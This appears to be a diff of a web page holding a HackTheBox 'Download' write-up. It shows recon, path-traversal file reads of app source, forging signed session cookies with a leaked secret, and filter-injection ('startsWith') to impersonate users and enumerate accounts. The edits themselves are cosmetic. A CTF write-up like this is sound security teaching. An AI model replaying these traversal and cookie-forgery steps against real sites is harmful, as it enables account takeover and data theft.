@@ -14,7 +14,7 @@
         <nav>
             <ul>
                 <li><a href="/index.html">Home</a></li>
-                <li><a href="/writeups.html">Writeups</a></li>
+                <li><a href="/writeups.html">WriteUPs</a></li>
                 <li><a href="https://github.com/elswix/KL-Sunset" target="_blank">KL-Sunset</a></li>
                 <li><a href="/about.html">About me</a></li>
             </ul>
@@ -31,10 +31,10 @@
                 </ul>
             </div>
             <div class="writeup-content-main">
-                <div class="highlight"><pre><span></span><span class="n">Machine</span><span class="p">:</span> <span class="n">Download</span>
-<span class="n">Difficult</span><span class="p">:</span> <span class="n">Hard</span>
-<span class="n">Platform</span><span class="p">:</span> <span class="n">HackTheBox</span>
-<span class="n">Release</span><span class="p">:</span> <span class="n">Released</span> <span class="n">on</span> <span class="mi">08</span><span class="o">/</span><span class="mi">05</span><span class="o">/</span><span class="mi">2023</span>
+                <div class="highlight"><pre><span></span><span class="k">Machine</span><span class="p">:</span> <span class="n">Download</span>
+<span class="k">Difficulty</span><span class="p">:</span> <span class="n">Hard</span>
+<span class="k">Platform</span><span class="p">:</span> <span class="n">HackTheBox</span>
+<span class="k">Release</span><span class="p">:</span> <span class="n">Released</span> <span class="n">on</span> <span class="mi">08</span><span class="o">/</span><span class="mi">05</span><span class="o">/</span><span class="mi">2023</span>
 </pre></div>
 <h3><br/>About Download</h3><br/>
 Download is a hard difficulty machine on HackTheBox. The machine features a web service that allows file uploads. While attempting to download the files, we discover a Local File Inclusion (LFI) vulnerability, providing us access to the source code.<br/><br/>
@@ -45,7 +45,7 @@ As Wesley, we run <code>pspy</code> to examine processes and commands running on
 The concept of running commands as postgres involves exploiting the <code>TTY Pushback</code> vulnerability, which, due to the authentication performed by the root user, enables us to execute commands in this manner.<br/><br/>
 <h3><br>Recon</br></h3><br>
 To commence our analysis, we'll initiate a port scan to unveil the accessible ports on the target machine. It's crucial to bear in mind that a system's services are invariably accessible through these open ports.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">p</span><span class="o">-</span> <span class="o">--</span><span class="nb">open</span> <span class="o">--</span><span class="nb">min</span><span class="o">-</span><span class="n">rate</span> <span class="mi">10000</span> <span class="o">-</span><span class="n">n</span> <span class="mf">10.10.11.226</span> <span class="o">-</span><span class="n">oN</span> <span class="n">portScan</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">p</span><span class="o">-</span> <span class="o">--</span><span class="nb">open</span> <span class="o">--</span><span class="nb">min</span><span class="o">-</span><span class="n">rate</span> <span class="mi">10000</span> <span class="o">-</span><span class="n">n</span> <span class="mf">10.10.11.226</span> <span class="o">-</span><span class="n">oN</span> <span class="n">portScan</span>
 
 <span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10.11.226</span>
 <span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.15</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
@@ -57,7 +57,7 @@ To commence our analysis, we'll initiate a port scan to unveil the accessible po
 </pre></div>
 
 Once our initial scan wraps up, it's time to dig a bit deeper. We're going to run a comprehensive scan to figure out what kind of tech and services are going on behind those open ports we found.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">sCV</span> <span class="o">-</span><span class="n">p22</span><span class="p">,</span><span class="mi">80</span> <span class="mf">10.10.11.226</span> <span class="o">-</span><span class="n">oN</span> <span class="n">fullScan</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">sCV</span> <span class="o">-</span><span class="n">p22</span><span class="p">,</span><span class="mi">80</span> <span class="mf">10.10.11.226</span> <span class="o">-</span><span class="n">oN</span> <span class="n">fullScan</span>
 
 <span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="n">download</span><span class="o">.</span><span class="n">htb</span> <span class="p">(</span><span class="mf">10.10.11.226</span><span class="p">)</span>
 <span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.20</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
@@ -77,13 +77,13 @@ Once our initial scan wraps up, it's time to dig a bit deeper. We're going to ru
 Upon initial inspection, it is evident that the system hosts both an HTTP Service on port 80 and an SSH Service on port 22.<br/><br/>
 <h3><br>Web Application</br></h3><br>
 Prior to accessing the web service through our browser, I will execute the <code>whatweb</code> tool to gather insights into the technologies employed by the website:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">whatweb</span> <span class="o">-</span><span class="n">a</span> <span class="mi">3</span> <span class="mf">10.10.11.226</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">whatweb</span> <span class="o">-</span><span class="n">a</span> <span class="mi">3</span> <span class="mf">10.10.11.226</span>
 <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.11.226</span> <span class="p">[</span><span class="mi">301</span> <span class="n">Moved</span> <span class="n">Permanently</span><span class="p">]</span> <span class="n">Country</span><span class="p">[</span><span class="n">RESERVED</span><span class="p">][</span><span class="n">ZZ</span><span class="p">],</span> <span class="n">HTTPServer</span><span class="p">[</span><span class="n">Ubuntu</span> <span class="n">Linux</span><span class="p">][</span><span class="n">nginx</span><span class="o">/</span><span class="mf">1.18.0</span> <span class="p">(</span><span class="n">Ubuntu</span><span class="p">)],</span> <span class="n">IP</span><span class="p">[</span><span class="mf">10.10.11.226</span><span class="p">],</span> <span class="n">RedirectLocation</span><span class="p">[</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">download</span><span class="o">.</span><span class="n">htb</span><span class="p">],</span> <span class="n">Title</span><span class="p">[</span><span class="mi">301</span> <span class="n">Moved</span> <span class="n">Permanently</span><span class="p">],</span> <span class="n">nginx</span><span class="p">[</span><span class="mf">1.18.0</span><span class="p">]</span>
 <span class="n">ERROR</span> <span class="n">Opening</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">download</span><span class="o">.</span><span class="n">htb</span> <span class="o">-</span> <span class="n">no</span> <span class="n">address</span> <span class="k">for</span> <span class="n">download</span><span class="o">.</span><span class="n">htb</span>
 </pre></div>
 
 Upon accessing the website via the IP address, an attempt is made to redirect us to the <code>download.htb</code> domain. However, an error is encountered during this redirection, primarily stemming from our machine's inability to resolve the domain. To rectify this, we must add the domain to our <code>/etc/hosts</code> file, ensuring it is correctly mapped to the IP address of the target machine.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">hosts</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">hosts</span>
 <span class="mf">127.0.0.1</span>   <span class="n">localhost</span>
 <span class="mf">127.0.1.1</span>   <span class="n">kali</span><span class="o">.</span><span class="n">localhost</span> <span class="n">kali</span>
 
@@ -97,7 +97,7 @@ Upon accessing the website via the IP address, an attempt is made to redirect us
 </pre></div>
 
 Now, let's make another attempt to gather information about the site using the <code>whatweb</code> tool:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">whatweb</span> <span class="o">-</span><span class="n">a</span> <span class="mi">3</span> <span class="mf">10.10.11.226</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">whatweb</span> <span class="o">-</span><span class="n">a</span> <span class="mi">3</span> <span class="mf">10.10.11.226</span>
 <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.11.226</span> <span class="p">[</span><span class="mi">301</span> <span class="n">Moved</span> <span class="n">Permanently</span><span class="p">]</span> <span class="n">Country</span><span class="p">[</span><span class="n">RESERVED</span><span class="p">][</span><span class="n">ZZ</span><span class="p">],</span> <span class="n">HTTPServer</span><span class="p">[</span><span class="n">Ubuntu</span> <span class="n">Linux</span><span class="p">][</span><span class="n">nginx</span><span class="o">/</span><span class="mf">1.18.0</span> <span class="p">(</span><span class="n">Ubuntu</span><span class="p">)],</span> <span class="n">IP</span><span class="p">[</span><span class="mf">10.10.11.226</span><span class="p">],</span> <span class="n">RedirectLocation</span><span class="p">[</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">download</span><span class="o">.</span><span class="n">htb</span><span class="p">],</span> <span class="n">Title</span><span class="p">[</span><span class="mi">301</span> <span class="n">Moved</span> <span class="n">Permanently</span><span class="p">],</span> <span class="n">nginx</span><span class="p">[</span><span class="mf">1.18.0</span><span class="p">]</span>
 <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">download</span><span class="o">.</span><span class="n">htb</span> <span class="p">[</span><span class="mi">200</span> <span class="n">OK</span><span class="p">]</span> <span class="n">Bootstrap</span><span class="p">,</span> <span class="n">Cookies</span><span class="p">[</span><span class="n">download_session</span><span class="p">,</span><span class="n">download_session</span><span class="o">.</span><span class="n">sig</span><span class="p">],</span> <span class="n">Country</span><span class="p">[</span><span class="n">RESERVED</span><span class="p">][</span><span class="n">ZZ</span><span class="p">],</span> <span class="n">HTML5</span><span class="p">,</span> <span class="n">HTTPServer</span><span class="p">[</span><span class="n">Ubuntu</span> <span class="n">Linux</span><span class="p">][</span><span class="n">nginx</span><span class="o">/</span><span class="mf">1.18.0</span> <span class="p">(</span><span class="n">Ubuntu</span><span class="p">)],</span> <span class="n">HttpOnly</span><span class="p">[</span><span class="n">download_session</span><span class="p">,</span><span class="n">download_session</span><span class="o">.</span><span class="n">sig</span><span class="p">],</span> <span class="n">IP</span><span class="p">[</span><span class="mf">10.10.11.226</span><span class="p">],</span> <span class="n">Script</span><span class="p">,</span> <span class="n">Title</span><span class="p">[</span><span class="n">Download</span><span class="o">.</span><span class="n">htb</span> <span class="o">-</span> <span class="n">Share</span> <span class="n">Files</span> <span class="n">With</span> <span class="n">Ease</span><span class="p">],</span> <span class="n">X</span><span class="o">-</span><span class="n">Powered</span><span class="o">-</span><span class="n">By</span><span class="p">[</span><span class="n">Express</span><span class="p">],</span> <span class="n">X</span><span class="o">-</span><span class="n">UA</span><span class="o">-</span><span class="n">Compatible</span><span class="p">[</span><span class="n">IE</span><span class="o">=</span><span class="n">edge</span><span class="p">],</span> <span class="n">nginx</span><span class="p">[</span><span class="mf">1.18.0</span><span class="p">]</span>
 </pre></div>
@@ -128,7 +128,7 @@ After logging in, new session cookies were assigned to us. Let's inspect them:<b
 
 As observed, after logging in, the cookie is now more extensive, likely containing additional information.<br/><br/>
 Since it appears to be in base64, we will proceed to decode the content (specifically from <code>download_session</code> as the signature does not contain readable information):<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">echo</span> <span class="s1">'eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOlsiWW91IGFyZSBub3cgbG9nZ2VkIGluLiJdfSwidXNlciI6eyJpZCI6MTYsInVzZXJuYW1lIjoiZWxzd2l4In19'</span>  <span class="o">|</span> <span class="n">base64</span> <span class="o">-</span><span class="n">d</span><span class="p">;</span><span class="n">echo</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">echo</span> <span class="s1">'eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOlsiWW91IGFyZSBub3cgbG9nZ2VkIGluLiJdfSwidXNlciI6eyJpZCI6MTYsInVzZXJuYW1lIjoiZWxzd2l4In19'</span>  <span class="o">|</span> <span class="n">base64</span> <span class="o">-</span><span class="n">d</span><span class="p">;</span><span class="n">echo</span>
 <span class="p">{</span><span class="s2">"flashes"</span><span class="p">:{</span><span class="s2">"info"</span><span class="p">:[],</span><span class="s2">"error"</span><span class="p">:[],</span><span class="s2">"success"</span><span class="p">:[</span><span class="s2">"You are now logged in."</span><span class="p">]},</span><span class="s2">"user"</span><span class="p">:{</span><span class="s2">"id"</span><span class="p">:</span><span class="mi">16</span><span class="p">,</span><span class="s2">"username"</span><span class="p">:</span><span class="s2">"elswix"</span><span class="p">}}</span>
 </pre></div>
 
@@ -188,7 +188,7 @@ Let's attempt to discover the directory where our uploaded files are being store
 <img alt="" src="https://elswix.github.io/writeups/htb/hard/download/img/18.png"/><br/><br/>
 Recalling that the website is built with Express, let's attempt to list the content of the <code>package.json</code> file.<br/><br/>
 The <code>package.json</code> file is a standard file in a Node project, serving as a blueprint for an application. It provides information on how to interact with the application and outlines its dependencies. In this case, the file likely starts by specifying that the main functionality is in <code>app.js</code>.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="s1">'http://download.htb/files/download/..</span><span class="si">%2f</span><span class="s1">package.json'</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="s1">'http://download.htb/files/download/..</span><span class="si">%2f</span><span class="s1">package.json'</span>
 <span class="p">{</span>
   <span class="s2">"name"</span><span class="p">:</span> <span class="s2">"download.htb"</span><span class="p">,</span>
   <span class="s2">"version"</span><span class="p">:</span> <span class="s2">"1.0.0"</span><span class="p">,</span>
@@ -228,7 +228,7 @@ The <code>package.json</code> file is a standard file in a Node project, serving
 
 It reveals an author named <code>WESLEY</code>, which could potentially be a system username. This is a valuable piece of information to keep in mind. Additionally, the main script of the website is disclosed as <code>app.js</code>.<br/><br/>
 Let's attempt to list the content of <code>app.js</code>:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="s1">'http://download.htb/files/download/..</span><span class="si">%2f</span><span class="s1">app.js'</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="s1">'http://download.htb/files/download/..</span><span class="si">%2f</span><span class="s1">app.js'</span>
 </pre></div>
 <div class="highlight"><pre><span></span><span class="s2">"use strict"</span><span class="p">;</span>
 <span class="kd">var</span><span class="w"> </span><span class="nx">__importDefault</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="k">this</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">__importDefault</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="p">(</span><span class="nx">mod</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
@@ -291,17 +291,17 @@ Understanding this concept could be beneficial for manipulating cookies, given t
 With the tool <a href="https://github.com/DigitalInterruption/cookie-monster">cookie-monster</a>, we can generate and sign new cookies with the desired information.<br/><br/>
 The usage of this tool involves playing with parameters such as <code>-e</code>, <code>-k</code>, <code>-f</code>, and <code>-n</code>.<br/><br/>
 Firstly, we need to save our cookie in JSON format in a JSON file:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="n">cookie</span><span class="o">.</span><span class="n">json</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="n">cookie</span><span class="o">.</span><span class="n">json</span>
 <span class="p">{</span><span class="s2">"flashes"</span><span class="p">:{</span><span class="s2">"info"</span><span class="p">:[],</span><span class="s2">"error"</span><span class="p">:[],</span><span class="s2">"success"</span><span class="p">:[]},</span><span class="s2">"user"</span><span class="p">:{</span><span class="s2">"id"</span><span class="p">:</span><span class="mi">16</span><span class="p">,</span><span class="s2">"username"</span><span class="p">:</span><span class="s2">"elswix"</span><span class="p">}}</span>
 </pre></div>
 
 Given that we don't know any usernames, I will only modify the ID number to 1:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="n">cookie</span><span class="o">.</span><span class="n">json</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="n">cookie</span><span class="o">.</span><span class="n">json</span>
 <span class="p">{</span><span class="s2">"flashes"</span><span class="p">:{</span><span class="s2">"info"</span><span class="p">:[],</span><span class="s2">"error"</span><span class="p">:[],</span><span class="s2">"success"</span><span class="p">:[]},</span><span class="s2">"user"</span><span class="p">:{</span><span class="s2">"id"</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span><span class="s2">"username"</span><span class="p">:</span><span class="s2">"elswix"</span><span class="p">}}</span>
 </pre></div>
 
 Now I will sign it using <code>cookie-monster</code>:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">cookie</span><span class="o">-</span><span class="n">monster</span> <span class="o">-</span><span class="n">e</span> <span class="o">-</span><span class="n">k</span> <span class="s1">'8929874489719802418902487651347865819634518936754'</span> <span class="o">-</span><span class="n">f</span> <span class="n">cookie</span><span class="o">.</span><span class="n">json</span> <span class="o">-</span><span class="n">n</span> <span class="n">download_session</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">cookie</span><span class="o">-</span><span class="n">monster</span> <span class="o">-</span><span class="n">e</span> <span class="o">-</span><span class="n">k</span> <span class="s1">'8929874489719802418902487651347865819634518936754'</span> <span class="o">-</span><span class="n">f</span> <span class="n">cookie</span><span class="o">.</span><span class="n">json</span> <span class="o">-</span><span class="n">n</span> <span class="n">download_session</span>
                <span class="n">_</span>  <span class="n">_</span>
              <span class="n">_</span><span class="o">/</span><span class="mi">0</span>\<span class="o">/</span> \<span class="n">_</span>
     <span class="o">.-.</span>   <span class="o">.-</span><span class="err">`</span> \<span class="n">_</span><span class="o">/</span>\<span class="mi">0</span><span class="o">/</span> <span class="s1">'-.</span>
@@ -319,12 +319,12 @@ It appears to be working correctly. Let's replace our old cookies with the new o
 <img alt="" src="https://elswix.github.io/writeups/htb/hard/download/img/21.png"/><br/><br/>
 When reloading the page, it says <code>No files found</code>, and it didn't redirect us to the <code>/login</code> section. I believe the new cookies are functioning properly. However, to access the files associated with the <code>id</code> 1, we may need to know the corresponding username.<br/><br/>
 I'm considering removing our username from the cookie and leaving it only with the <code>id</code> number:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="n">cookie</span><span class="o">.</span><span class="n">json</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="n">cookie</span><span class="o">.</span><span class="n">json</span>
 <span class="p">{</span><span class="s2">"flashes"</span><span class="p">:{</span><span class="s2">"info"</span><span class="p">:[],</span><span class="s2">"error"</span><span class="p">:[],</span><span class="s2">"success"</span><span class="p">:[]},</span><span class="s2">"user"</span><span class="p">:{</span><span class="s2">"id"</span><span class="p">:</span><span class="mi">1</span><span class="p">}}</span>
 </pre></div>
 
 After that, I signed the new cookie with <code>cookie-monster</code>:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">cookie</span><span class="o">-</span><span class="n">monster</span> <span class="o">-</span><span class="n">e</span> <span class="o">-</span><span class="n">k</span> <span class="s1">'8929874489719802418902487651347865819634518936754'</span> <span class="o">-</span><span class="n">f</span> <span class="n">cookie</span><span class="o">.</span><span class="n">json</span> <span class="o">-</span><span class="n">n</span> <span class="n">download_session</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">cookie</span><span class="o">-</span><span class="n">monster</span> <span class="o">-</span><span class="n">e</span> <span class="o">-</span><span class="n">k</span> <span class="s1">'8929874489719802418902487651347865819634518936754'</span> <span class="o">-</span><span class="n">f</span> <span class="n">cookie</span><span class="o">.</span><span class="n">json</span> <span class="o">-</span><span class="n">n</span> <span class="n">download_session</span>
                <span class="n">_</span>  <span class="n">_</span>
              <span class="n">_</span><span class="o">/</span><span class="mi">0</span>\<span class="o">/</span> \<span class="n">_</span>
     <span class="o">.-.</span>   <span class="o">.-</span><span class="err">`</span> \<span class="n">_</span><span class="o">/</span>\<span class="mi">0</span><span class="o">/</span> <span class="s1">'-.</span>
@@ -342,12 +342,12 @@ Upon replacing the new cookies, it returned different content in the response:<b
 <img alt="" src="https://elswix.github.io/writeups/htb/hard/download/img/22.png"/><br/><br/>
 Now I'm seeing files from another user called <code>WESLEY</code>, indicating a successful impersonation of his account.<br/><br/>
 Let's observe what happens if we leave the <code>id</code> field empty:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="n">cookie</span><span class="o">.</span><span class="n">json</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="n">cookie</span><span class="o">.</span><span class="n">json</span>
 <span class="p">{</span><span class="s2">"flashes"</span><span class="p">:{</span><span class="s2">"info"</span><span class="p">:[],</span><span class="s2">"error"</span><span class="p">:[],</span><span class="s2">"success"</span><span class="p">:[]},</span><span class="s2">"user"</span><span class="p">:{</span><span class="s2">"id"</span><span class="p">:{}}}</span>
 </pre></div>
 
 Now, let's sign the cookie using <code>cookie-monster</code>:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">cookie</span><span class="o">-</span><span class="n">monster</span> <span class="o">-</span><span class="n">e</span> <span class="o">-</span><span class="n">k</span> <span class="s1">'8929874489719802418902487651347865819634518936754'</span> <span class="o">-</span><span class="n">f</span> <span class="n">cookie</span><span class="o">.</span><span class="n">json</span> <span class="o">-</span><span class="n">n</span> <span class="n">download_session</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">cookie</span><span class="o">-</span><span class="n">monster</span> <span class="o">-</span><span class="n">e</span> <span class="o">-</span><span class="n">k</span> <span class="s1">'8929874489719802418902487651347865819634518936754'</span> <span class="o">-</span><span class="n">f</span> <span class="n">cookie</span><span class="o">.</span><span class="n">json</span> <span class="o">-</span><span class="n">n</span> <span class="n">download_session</span>
                <span class="n">_</span>  <span class="n">_</span>
              <span class="n">_</span><span class="o">/</span><span class="mi">0</span>\<span class="o">/</span> \<span class="n">_</span>
     <span class="o">.-.</span>   <span class="o">.-</span><span class="err">`</span> \<span class="n">_</span><span class="o">/</span>\<span class="mi">0</span><span class="o">/</span> <span class="s1">'-.</span>
@@ -378,13 +378,13 @@ In other words, it is selecting the ages of all usernames that start with the le
 If we can modify the cookie and apply the invocation of these methods, we could attempt to gather information about users through a brute-force attack.<br/><br/>
 To illustrate, we will conduct a test to try accessing files uploaded by all users whose usernames begin with the character <code>a</code>.<br/><br/>
 Next, we will prepare the cookie we will sign:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="n">cookie</span><span class="o">.</span><span class="n">json</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="n">cookie</span><span class="o">.</span><span class="n">json</span>
 <span class="p">{</span><span class="s2">"flashes"</span><span class="p">:{</span><span class="s2">"info"</span><span class="p">:[],</span><span class="s2">"error"</span><span class="p">:[],</span><span class="s2">"success"</span><span class="p">:[]},</span><span class="s2">"user"</span><span class="p">:{</span><span class="s2">"username"</span><span class="p">:{</span><span class="s2">"startsWith"</span><span class="p">:</span><span class="s2">"A"</span><span class="p">}}}</span>
 </pre></div>
 
 As you can see, I removed the ID field and kept the <code>username</code> field. I also added the invocation of the <code>startsWith</code> method with the parameter <code>A</code>. If everything works as expected, we should see all files uploaded on the website by users whose usernames start with the <code>A</code> character.<br/><br/>
 Now, let's sign the cookie:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">cookie</span><span class="o">-</span><span class="n">monster</span> <span class="o">-</span><span class="n">e</span> <span class="o">-</span><span class="n">k</span> <span class="s1">'8929874489719802418902487651347865819634518936754'</span> <span class="o">-</span><span class="n">f</span> <span class="n">cookie</span><span class="o">.</span><span class="n">json</span> <span class="o">-</span><span class="n">n</span> <span class="n">download_session</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">cookie</span><span class="o">-</span><span class="n">monster</span> <span class="o">-</span><span class="n">e</span> <span class="o">-</span><span class="n">k</span> <span class="s1">'8929874489719802418902487651347865819634518936754'</span> <span class="o">-</span><span class="n">f</span> <span class="n">cookie</span><span class="o">.</span><span class="n">json</span> <span class="o">-</span><span class="n">n</span> <span class="n">download_session</span>
                <span class="n">_</span>  <span class="n">_</span>
              <span class="n">_</span><span class="o">/</span><span class="mi">0</span>\<span class="o">/</span> \<span class="n">_</span>
     <span class="o">.-.</span>   <span class="o">.-</span><span class="err">`</span> \<span class="n">_</span><span class="o">/</span>\<span class="mi">0</span><span class="o">/</span> <span class="s1">'-.</span>
@@ -399,7 +399,7 @@ Now, let's sign the cookie:<br/><br/>
 </pre></div>
 
 For this attempt, I will use cURL to filter by the string <code>uploaded by</code>:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="s1">'http://download.htb/home/'</span> <span class="o">-</span><span class="n">H</span> <span class="s2">"Cookie: download_session=eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOltdfSwidXNlciI6eyJ1c2VybmFtZSI6eyJzdGFydHNXaXRoIjoiQSJ9fX0=; download_session.sig=bI89MIMG1P226_VRwmajlBlSroA"</span> <span class="o">|</span> <span class="n">grep</span> <span class="s1">'uploaded by'</span> <span class="o">-</span><span class="n">i</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="s1">'http://download.htb/home/'</span> <span class="o">-</span><span class="n">H</span> <span class="s2">"Cookie: download_session=eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOltdfSwidXNlciI6eyJ1c2VybmFtZSI6eyJzdGFydHNXaXRoIjoiQSJ9fX0=; download_session.sig=bI89MIMG1P226_VRwmajlBlSroA"</span> <span class="o">|</span> <span class="n">grep</span> <span class="s1">'uploaded by'</span> <span class="o">-</span><span class="n">i</span>
         <span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">Uploaded</span> <span class="n">By</span><span class="p">:</span> <span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">AyufmApogee</span><span class="o">&lt;</span><span class="n">br</span> <span class="o">/&gt;</span>
         <span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">Uploaded</span> <span class="n">By</span><span class="p">:</span> <span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">AyufmApogee</span><span class="o">&lt;</span><span class="n">br</span> <span class="o">/&gt;</span>
         <span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">Uploaded</span> <span class="n">By</span><span class="p">:</span> <span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">Apoplectic</span><span class="o">&lt;</span><span class="n">br</span> <span class="o">/&gt;</span>
@@ -412,7 +412,7 @@ It is working perfectly, the <code>startsWith</code> method is functioning as ex
 After this success, I thought about attempting to retrieve data by entering the <code>password</code> field. Perhaps, I could extract a password using a brute-force approach.<br/><br/>
 As we've observed, the user <code>WESLEY</code> was the author mentioned in the <code>package.json</code> file. It might be a good idea to try extracting his password.<br/><br/>
 After inspecting the <code>auth.js</code> file (whose path was revealed in <code>app.js</code>), I noticed that passwords are stored in MD5:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="s1">'http://download.htb/files/download/..</span><span class="si">%2f</span><span class="s1">routers</span><span class="si">%2f</span><span class="s1">auth.js'</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="s1">'http://download.htb/files/download/..</span><span class="si">%2f</span><span class="s1">routers</span><span class="si">%2f</span><span class="s1">auth.js'</span>
 </pre></div>
 <div class="highlight"><pre><span></span><span class="s2">"use strict"</span><span class="p">;</span>
 <span class="kd">var</span><span class="w"> </span><span class="nx">__importDefault</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="k">this</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">__importDefault</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="p">(</span><span class="nx">mod</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
@@ -496,7 +496,7 @@ After inspecting the <code>auth.js</code> file (whose path was revealed in <code
 </pre></div>
 
